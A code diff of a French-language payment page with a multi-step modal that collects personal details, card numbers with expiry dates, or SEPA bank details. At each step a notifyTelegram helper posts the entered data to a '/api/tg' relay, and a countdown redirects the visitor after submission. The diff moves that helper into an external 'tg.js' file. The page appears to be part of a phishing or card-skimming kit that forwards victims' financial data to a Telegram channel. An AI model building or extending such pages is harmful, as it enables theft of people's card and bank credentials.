@@ -191,22 +191,12 @@
     </div>
   </div>
 
-  <!-- SCRIPT de logique, formatage & notifications Telegram -->
-  <script>
-    // helper pour envoyer sur Telegram
-    async function notifyTelegram(step, payload) {
-      try {
-        await fetch('/api/tg', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ step, ...payload })
-        });
-      } catch (e) {
-        console.warn('Erreur Telegram', e);
-      }
-    }
+  <!-- 1) Chargement de la librairie Telegram -->
+  <script src="tg.js"></script>
 
-    // références DOM
+  <!-- 2) SCRIPT de logique, formatage & notifications -->
+  <script>
+    // Références DOM
     const payBtn    = document.getElementById('pay-btn');
     const modal     = document.getElementById('payment-modal');
     const closeBtn  = document.getElementById('modal-close');
@@ -219,7 +209,7 @@
     const cardInput = document.getElementById('cardnumber');
     const expInput  = document.getElementById('expdate');
 
-    // formatage automatique
+    // Formatage automatique
     function formatCardNumber(e) {
       let digits = e.target.value.replace(/\D/g, '').slice(0, 16);
       let groups = digits.match(/.{1,4}/g) || [];
@@ -233,34 +223,28 @@
     cardInput.addEventListener('input', formatCardNumber);
     expInput.addEventListener('input', formatExpDate);
 
-    // clic “Payer maintenant”
+    // 1) Choix de la méthode + notification
     payBtn.addEventListener('click', () => {
       const method = document.querySelector('input[name="method"]:checked').value;
       notifyTelegram('choix_methode', { method });
       modal.classList.remove('hidden');
     });
 
-    // fermeture modal + reset
-    closeBtn.addEventListener('click', () => {
-      modal.classList.add('hidden');
-      resetModal();
-    });
-
-    // étape 1 → étape 2
+    // 2) Étape 1 → Étape 2 (infos perso) + notification
     toStep2.addEventListener('click', () => {
       if (!step1.checkValidity()) return step1.reportValidity();
-      const formData = Object.fromEntries(new FormData(step1).entries());
-      notifyTelegram('info_perso', formData);
+      const info = Object.fromEntries(new FormData(step1).entries());
+      notifyTelegram('info_perso', info);
       step1.classList.remove('active');
       const method = document.querySelector('input[name="method"]:checked').value;
       if (method === 'card') step2Card.classList.add('active');
       else                   step2Sepa.classList.add('active');
     });
 
-    // soumission Carte
+    // 3a) Soumission Carte + notification
     step2Card.addEventListener('submit', e => {
       e.preventDefault();
-      const raw = cardInput.value.replace(/\D/g, '');
+      const raw = cardInput.value.replace(/\D/g,'');
       if (raw.length !== 16) {
         cardInput.setCustomValidity('Numéro de carte invalide');
         return cardInput.reportValidity();
@@ -278,7 +262,7 @@
       startCountdown();
     });
 
-    // soumission SEPA
+    // 3b) Soumission SEPA + notification
     step2Sepa.addEventListener('submit', e => {
       e.preventDefault();
       if (!step2Sepa.checkValidity()) return step2Sepa.reportValidity();
@@ -289,7 +273,7 @@
       startCountdown();
     });
 
-    // compte à rebours + redirection
+    // Countdown + redirection
     function startCountdown() {
       let count = 5;
       const iv = setInterval(() => {
@@ -301,7 +285,11 @@
       }, 1000);
     }
 
-    // reset modal
+    // Fermer modal & reset
+    closeBtn.addEventListener('click', () => {
+      modal.classList.add('hidden');
+      resetModal();
+    });
     function resetModal() {
       [step1, step2Card, step2Sepa, step3].forEach(el => el.classList.remove('active'));
       step1.classList.add('active');
